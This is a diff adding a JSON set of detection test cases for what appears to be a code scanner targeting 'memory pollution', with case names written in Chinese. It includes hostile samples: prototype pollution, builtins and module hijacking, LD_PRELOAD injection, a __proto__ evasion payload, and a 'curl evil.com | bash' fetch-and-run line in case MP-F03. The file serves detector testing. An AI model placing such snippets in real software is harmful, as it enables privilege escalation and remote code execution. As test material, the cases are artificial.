@@ -1,0 +1,508 @@
+[
+  {
+    "id": "MP-F01",
+    "name": "Python 全局变量污染检测",
+    "type": "functionality",
+    "category": "MEMORY_POLLUTION",
+    "severity": "medium",
+    "description": "检测恶意修改 Python 全局变量的行为",
+    
+    "input": {
+      "file": "samples/ready/memory_pollution/python_global.py",
+      "content": "import builtins\nbuiltins.open = lambda *args: malicious_open(*args)\nbuiltins.import = __import__"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 75,
+      "rules_matched": ["MP-YARA-001"],
+      "indicators": ["builtins modification", "function override"]
+    },
+    
+    "sample_code": "import builtins\nbuiltins.open = lambda *args: malicious_open(*args)",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "MP-F02",
+    "name": "JavaScript prototype 污染检测",
+    "type": "functionality",
+    "category": "MEMORY_POLLUTION",
+    "severity": "high",
+    "description": "检测 JavaScript prototype 污染攻击",
+    
+    "input": {
+      "file": "samples/ready/memory_pollution/js_prototype.js",
+      "content": "Object.prototype.isAdmin = true;\nObject.prototype.authenticated = true;\nconsole.log({}.isAdmin); // true"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 85,
+      "rules_matched": ["MP-YARA-002"],
+      "indicators": ["Object.prototype modification", "prototype pollution"]
+    },
+    
+    "sample_code": "Object.prototype.isAdmin = true;\nObject.prototype.authenticated = true;",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "MP-F03",
+    "name": "Python sys.modules 污染检测",
+    "type": "functionality",
+    "category": "MEMORY_POLLUTION",
+    "severity": "high",
+    "description": "检测恶意替换 Python sys.modules 模块",
+    
+    "input": {
+      "file": "samples/ready/memory_pollution/python_sysmodules.py",
+      "content": "import sys\nclass FakeOS:\n    def system(self, cmd): return os.system('curl evil.com | bash')\nsys.modules['os'] = FakeOS()"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 88,
+      "rules_matched": ["MP-YARA-003"],
+      "indicators": ["sys.modules modification", "module replacement"]
+    },
+    
+    "sample_code": "import sys\nsys.modules['os'] = FakeOS()",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "MP-F04",
+    "name": "Node.js require 劫持检测",
+    "type": "functionality",
+    "category": "MEMORY_POLLUTION",
+    "severity": "high",
+    "description": "检测 Node.js require 函数劫持",
+    
+    "input": {
+      "file": "samples/ready/memory_pollution/nodejs_require.js",
+      "content": "const Module = require('module');\nconst originalRequire = Module.prototype.require;\nModule.prototype.require = function(id) {\n  if (id === 'crypto') return maliciousCrypto;\n  return originalRequire.apply(this, arguments);\n};"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 82,
+      "rules_matched": ["MP-YARA-004"],
+      "indicators": ["Module.prototype.require override", "require hijack"]
+    },
+    
+    "sample_code": "Module.prototype.require = function(id) { ... }",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "MP-F05",
+    "name": "Python __builtins__ 污染检测",
+    "type": "functionality",
+    "category": "MEMORY_POLLUTION",
+    "severity": "critical",
+    "description": "检测恶意修改 __builtins__ 字典",
+    
+    "input": {
+      "file": "samples/ready/memory_pollution/python_builtins.py",
+      "content": "__builtins__['exec'] = lambda code: exec(code, {'__builtins__': {}})\n__builtins__['eval'] = lambda code: eval(code, {'__builtins__': {}})"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 90,
+      "rules_matched": ["MP-YARA-005"],
+      "indicators": ["__builtins__ modification", "builtin override"]
+    },
+    
+    "sample_code": "__builtins__['exec'] = lambda code: exec(code, {'__builtins__': {}})",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "MP-F06",
+    "name": "Ruby 常量污染检测",
+    "type": "functionality",
+    "category": "MEMORY_POLLUTION",
+    "severity": "medium",
+    "description": "检测 Ruby 常量重新定义",
+    
+    "input": {
+      "file": "samples/ready/memory_pollution/ruby_constant.rb",
+      "content": "Object.send(:remove_const, :VERSION)\nObject.const_set(:VERSION, 'malicious')\nclass Kernel\n  def system(cmd); puts \"Intercepted: #{cmd}\"; end\nend"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 78,
+      "rules_matched": ["MP-YARA-006"],
+      "indicators": ["remove_const", "const_set", "Kernel modification"]
+    },
+    
+    "sample_code": "Object.send(:remove_const, :VERSION)\nclass Kernel; def system(cmd); ...; end; end",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "MP-F07",
+    "name": "PHP superglobal 污染检测",
+    "type": "functionality",
+    "category": "MEMORY_POLLUTION",
+    "severity": "high",
+    "description": "检测 PHP 超全局变量污染",
+    
+    "input": {
+      "file": "samples/ready/memory_pollution/php_superglobal.php",
+      "content": "<?php\n$GLOBALS['ADMIN'] = true;\n$_SERVER['REMOTE_ADDR'] = '127.0.0.1';\n$_SESSION['authenticated'] = true;\n?>"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 80,
+      "rules_matched": ["MP-YARA-007"],
+      "indicators": ["$GLOBALS modification", "$_SESSION manipulation"]
+    },
+    
+    "sample_code": "$GLOBALS['ADMIN'] = true;\n$_SESSION['authenticated'] = true;",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "MP-F08",
+    "name": "Java System 类污染检测",
+    "type": "functionality",
+    "category": "MEMORY_POLLUTION",
+    "severity": "high",
+    "description": "检测 Java System 类属性篡改",
+    
+    "input": {
+      "file": "samples/ready/memory_pollution/java_system.java",
+      "content": "System.setProperty('java.security.policy', 'malicious.policy');\nSystem.setSecurityManager(null);\nSystem.out = new PrintStream(new FileOutputStream('/dev/null'));"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 85,
+      "rules_matched": ["MP-YARA-008"],
+      "indicators": ["System.setProperty", "setSecurityManager", "System.out override"]
+    },
+    
+    "sample_code": "System.setProperty('java.security.policy', 'malicious.policy');\nSystem.setSecurityManager(null);",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "MP-F09",
+    "name": "PowerShell 会话状态污染",
+    "type": "functionality",
+    "category": "MEMORY_POLLUTION",
+    "severity": "medium",
+    "description": "检测 PowerShell 会话状态篡改",
+    
+    "input": {
+      "file": "samples/ready/memory_pollution/powershell_session.ps1",
+      "content": "$global:isAdmin = $true\n$env:PSModulePath = 'C:\\temp\\malicious;'\nSet-Variable -Name 'ConfirmPreference' -Value 'None' -Scope Global"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 72,
+      "rules_matched": ["MP-YARA-009"],
+      "indicators": ["$global: variable", "PSModulePath modification"]
+    },
+    
+    "sample_code": "$global:isAdmin = $true\n$env:PSModulePath = 'C:\\temp\\malicious;'",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "MP-F10",
+    "name": "Go init 函数污染检测",
+    "type": "functionality",
+    "category": "MEMORY_POLLUTION",
+    "severity": "medium",
+    "description": "检测 Go init 函数中的恶意初始化",
+    
+    "input": {
+      "file": "samples/ready/memory_pollution/go_init.go",
+      "content": "package main\nvar config = make(map[string]string)\nfunc init() {\n  config['admin'] = 'attacker'\n  config['debug'] = 'true'\n}"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 65,
+      "rules_matched": ["MP-YARA-010"],
+      "indicators": ["init function", "global variable modification"]
+    },
+    
+    "sample_code": "func init() { config['admin'] = 'attacker'; }",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "MP-A01",
+    "name": "间接原型污染绕过测试",
+    "type": "adversarial",
+    "category": "MEMORY_POLLUTION",
+    "severity": "high",
+    "description": "测试间接原型污染是否能绕过检测",
+    
+    "input": {
+      "file": "samples/ready/memory_pollution/indirect_prototype.js",
+      "content": "const obj = JSON.parse('{\"__proto__\": {\"isAdmin\": true}}');\nconsole.log({}.isAdmin);"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 80,
+      "rules_matched": ["MP-RUNTIME-001"],
+      "indicators": ["__proto__ injection", "JSON parse pollution"],
+      "evasion_technique": "indirect_prototype_pollution"
+    },
+    
+    "sample_code": "const obj = JSON.parse('{\"__proto__\": {\"isAdmin\": true}}');",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "MP-A02",
+    "name": "反射污染绕过测试",
+    "type": "adversarial",
+    "category": "MEMORY_POLLUTION",
+    "severity": "medium",
+    "description": "测试反射方式污染是否能绕过检测",
+    
+    "input": {
+      "file": "samples/ready/memory_pollution/reflective_pollution.py",
+      "content": "globals()['__builtins__'] = type('FakeBuiltins', (), {})()\nsetattr(globals(), 'open', lambda *args: None)"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 78,
+      "rules_matched": ["MP-RUNTIME-002"],
+      "indicators": ["globals() modification", "setattr builtin"],
+      "evasion_technique": "reflective_pollution"
+    },
+    
+    "sample_code": "globals()['__builtins__'] = type('FakeBuiltins', (), {})()",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "MP-B01",
+    "name": "边界测试 - 正常全局变量",
+    "type": "boundary",
+    "category": "MEMORY_POLLUTION",
+    "severity": "low",
+    "description": "测试正常全局变量定义是否误报",
+    
+    "input": {
+      "file": "samples/ready/memory_pollution/normal_global.py",
+      "content": "CONFIG = {'debug': False, 'version': '1.0'}\nMAX_CONNECTIONS = 100"
+    },
+    
+    "expected": {
+      "detected": false,
+      "risk_score": 5,
+      "rules_matched": [],
+      "indicators": [],
+      "boundary": "normal_global_variable"
+    },
+    
+    "sample_code": "CONFIG = {'debug': False, 'version': '1.0'}",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "MP-B02",
+    "name": "边界测试 - 正常配置修改",
+    "type": "boundary",
+    "category": "MEMORY_POLLUTION",
+    "severity": "low",
+    "description": "测试正常配置修改是否误报",
+    
+    "input": {
+      "file": "samples/ready/memory_pollution/normal_config.py",
+      "content": "import os\nos.environ['DEBUG'] = 'true'\nos.environ['PATH'] = '/usr/local/bin:' + os.environ.get('PATH', '')"
+    },
+    
+    "expected": {
+      "detected": false,
+      "risk_score": 10,
+      "rules_matched": [],
+      "indicators": [],
+      "boundary": "normal_env_modification"
+    },
+    
+    "sample_code": "os.environ['DEBUG'] = 'true'",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "MP-B03",
+    "name": "边界测试 - 合法模块替换",
+    "type": "boundary",
+    "category": "MEMORY_POLLUTION",
+    "severity": "low",
+    "description": "测试合法模块替换是否误报",
+    
+    "input": {
+      "file": "samples/ready/memory_pollution/normal_mock.py",
+      "content": "import unittest.mock as mock\nwith mock.patch('os.system') as mock_system:\n    # Test code\n    pass"
+    },
+    
+    "expected": {
+      "detected": false,
+      "risk_score": 5,
+      "rules_matched": [],
+      "indicators": [],
+      "boundary": "legitimate_mock"
+    },
+    
+    "sample_code": "with mock.patch('os.system') as mock_system: pass",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "MP-P01",
+    "name": "性能测试 - 批量污染检测",
+    "type": "performance",
+    "category": "MEMORY_POLLUTION",
+    "severity": "low",
+    "description": "测试批量检测 100 个污染样本的性能",
+    
+    "input": {
+      "file_count": 100,
+      "file_type": "mixed_memory_pollution"
+    },
+    
+    "expected": {
+      "detected_count": 70,
+      "false_positive": 0,
+      "max_latency_ms": 10000,
+      "avg_latency_ms": 100
+    },
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "MP-I01",
+    "name": "集成测试 - 污染 + 执行",
+    "type": "integration",
+    "category": "MEMORY_POLLUTION",
+    "severity": "critical",
+    "description": "测试内存污染结合代码执行的检测",
+    
+    "input": {
+      "files": ["pollute.py", "execute.py"],
+      "combination": "prototype_pollution + code_execution"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 92,
+      "rules_matched": ["MP-YARA-002", "TP-YARA-001"],
+      "indicators": ["prototype pollution", "malicious execution"],
+      "attack_chain": ["pollution", "exploitation"],
+      "combination": "pollution_and_execution"
+    },
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "MP-I02",
+    "name": "集成测试 - 多阶段污染",
+    "type": "integration",
+    "category": "MEMORY_POLLUTION",
+    "severity": "critical",
+    "description": "测试多阶段内存污染检测",
+    
+    "input": {
+      "stages": [
+        {"stage": 1, "action": "pollute_builtins", "target": "__builtins__"},
+        {"stage": 2, "action": "pollute_modules", "target": "sys.modules"},
+        {"stage": 3, "action": "exploit", "target": "import system"}
+      ],
+      "combination": "multi_stage_pollution"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 95,
+      "rules_matched": ["MP-YARA-003", "MP-YARA-005"],
+      "indicators": ["multi-stage pollution"],
+      "attack_chain": ["builtins", "modules", "exploitation"],
+      "combination": "multi_stage"
+    },
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "MP-F11",
+    "name": "C 全局变量污染检测",
+    "type": "functionality",
+    "category": "MEMORY_POLLUTION",
+    "severity": "medium",
+    "description": "检测 C 语言全局变量篡改",
+    
+    "input": {
+      "file": "samples/ready/memory_pollution/c_global.c",
+      "content": "extern int errno;\nerrno = 0; // Reset error\nchar *getenv(const char *name) { return \"malicious\"; }"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 70,
+      "rules_matched": ["MP-YARA-011"],
+      "indicators": ["errno modification", "getenv override"]
+    },
+    
+    "sample_code": "errno = 0;\nchar *getenv(const char *name) { return \"malicious\"; }",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  },
+  
+  {
+    "id": "MP-F12",
+    "name": "Shell 环境变量污染检测",
+    "type": "functionality",
+    "category": "MEMORY_POLLUTION",
+    "severity": "medium",
+    "description": "检测 Shell 环境变量恶意篡改",
+    
+    "input": {
+      "file": "samples/ready/memory_pollution/shell_env.sh",
+      "content": "export LD_PRELOAD=/tmp/malicious.so\nexport PATH=/tmp/malicious:$PATH\nexport LD_LIBRARY_PATH=/tmp/lib:$LD_LIBRARY_PATH"
+    },
+    
+    "expected": {
+      "detected": true,
+      "risk_score": 82,
+      "rules_matched": ["MP-YARA-012"],
+      "indicators": ["LD_PRELOAD", "PATH modification", "LD_LIBRARY_PATH"]
+    },
+    
+    "sample_code": "export LD_PRELOAD=/tmp/malicious.so\nexport PATH=/tmp/malicious:$PATH",
+    
+    "created_at": "2026-03-17T20:40:00Z"
+  }
+]
